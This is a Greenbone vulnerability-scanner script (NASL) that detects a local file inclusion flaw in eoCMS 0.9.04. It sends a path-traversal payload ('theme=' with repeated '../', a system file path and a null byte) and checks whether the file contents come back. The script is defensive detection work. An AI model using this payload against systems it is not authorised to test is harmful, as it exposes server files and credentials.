# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100881");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2010-10-29 12:58:08 +0200 (Fri, 29 Oct 2010)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("eoCMS <= 0.9.04 LFI Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"eoCMS is prone to multiple input-validation vulnerabilities, including:

  - HTML injection

  - SQL injection

  - Multiple local file include (LFI)

  Exploiting these issues could allow an attacker to steal cookie-based authentication credentials,
  compromise the application, access or modify data, exploit latent vulnerabilities in the
  underlying database, or obtain potentially sensitive information and execute arbitrary local
  scripts in the context of the webserver process. This may allow the attacker to compromise the
  application and the computer. Other attacks are also possible.

  eoCMS 0.9.04 is vulnerable. Other versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/44640");
  script_xref(name:"URL", value:"https://www.securityfocus.com/archive/1/514633");
  script_xref(name:"URL", value:"https://www.securityfocus.com/archive/1/514634");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("port_service_func.inc");
include("os_func.inc");

port = http_get_port( default:80 );

if( ! http_can_host_php( port:port ) )
  exit(0);

files = traversal_files();

foreach dir( make_list_unique( "/eocms", "/cms", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" )
    dir = "";

  res = http_get_cache( port:port, item:dir + "/index.php" );
  if( res !~ "^HTTP/1\.[01] 200" )
    continue;

  foreach file (keys(files)) {

    url = dir + "/index.php?theme=" + crap( data:"../", length: 3 * 9 ) + files[file] + "%00";

    if( http_vuln_check( port:port, url:url, pattern:file ) ) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
